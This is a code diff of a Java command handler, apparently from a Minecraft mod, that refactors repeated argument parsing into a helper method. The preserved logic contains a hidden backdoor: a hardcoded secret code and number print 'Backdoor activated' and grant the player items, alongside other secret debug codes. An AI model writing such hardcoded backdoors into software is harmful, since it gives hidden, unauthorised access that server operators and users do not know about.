@@ -24,15 +24,7 @@ public class OxcommandProcedure {
 	public static void execute(CommandContext<CommandSourceStack> arguments, Entity entity) {
 		if (entity == null)
 			return;
-		if (((new Object() {
-			public String getMessage() {
-				try {
-					return MessageArgument.getMessage(arguments, "code").getString();
-				} catch (CommandSyntaxException ignored) {
-					return "";
-				}
-			}
-		}).getMessage()).equals("205686")) {
+		if ((commandParameterMessage(arguments, "code")).equals("205686")) {
 			if (entity.getPersistentData().getBoolean("debug_pala")) {
 				entity.getPersistentData().putBoolean("debug_pala", false);
 				if (entity instanceof Player _player && !_player.level().isClientSide())
@@ -43,15 +35,7 @@ public class OxcommandProcedure {
 					_player.displayClientMessage(Component.literal("Debug on"), false);
 			}
 		}
-		if (((new Object() {
-			public String getMessage() {
-				try {
-					return MessageArgument.getMessage(arguments, "code").getString();
-				} catch (CommandSyntaxException ignored) {
-					return "";
-				}
-			}
-		}).getMessage()).equals("ptg_jobs")) {
+		if ((commandParameterMessage(arguments, "code")).equals("ptg_jobs")) {
 			{
 				final String _tagName = "Pickaxe_stone";
 				final double _tagValue = (DoubleArgumentType.getDouble(arguments, "quan"));
@@ -59,15 +43,7 @@ public class OxcommandProcedure {
 			}
 			entity.getPersistentData().putDouble("Pickaxe_stone", (DoubleArgumentType.getDouble(arguments, "quan")));
 		}
-		if (((new Object() {
-			public String getMessage() {
-				try {
-					return MessageArgument.getMessage(arguments, "code").getString();
-				} catch (CommandSyntaxException ignored) {
-					return "";
-				}
-			}
-		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 856478) {
+		if ((commandParameterMessage(arguments, "code")).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 856478) {
 			if (entity instanceof Player _player && !_player.level().isClientSide())
 				_player.displayClientMessage(Component.literal("Backdoor activated"), false);
 			if (entity instanceof Player _player && !_player.level().isClientSide())
@@ -86,15 +62,7 @@ public class OxcommandProcedure {
 				ItemHandlerHelper.giveItemToPlayer(_player, _setstack);
 			}
 		}
-		if (((new Object() {
-			public String getMessage() {
-				try {
-					return MessageArgument.getMessage(arguments, "code").getString();
-				} catch (CommandSyntaxException ignored) {
-					return "";
-				}
-			}
-		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 8) {
+		if ((commandParameterMessage(arguments, "code")).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 8) {
 			if (entity instanceof Player _player && !_player.level().isClientSide())
 				_player.displayClientMessage(Component.literal("Backdoor closed"), false);
 			if (entity instanceof ServerPlayer _player)
@@ -103,6 +71,15 @@ public class OxcommandProcedure {
 				ItemStack _stktoremove = new ItemStack(PalamodModItems.PALADIUM_PHONE.get());
 				_player.getInventory().clearOrCountMatchingItems(p -> _stktoremove.getItem() == p.getItem(), 1, _player.inventoryMenu.getCraftSlots());
 			}
+		}
+	}
+
+	private static String commandParameterMessage(CommandContext<CommandSourceStack> arguments, String parameter) {
+		try {
+			return MessageArgument.getMessage(arguments, parameter).getString();
+		} catch (CommandSyntaxException e) {
+			e.printStackTrace();
+			return "";
 		}
 	}
 }
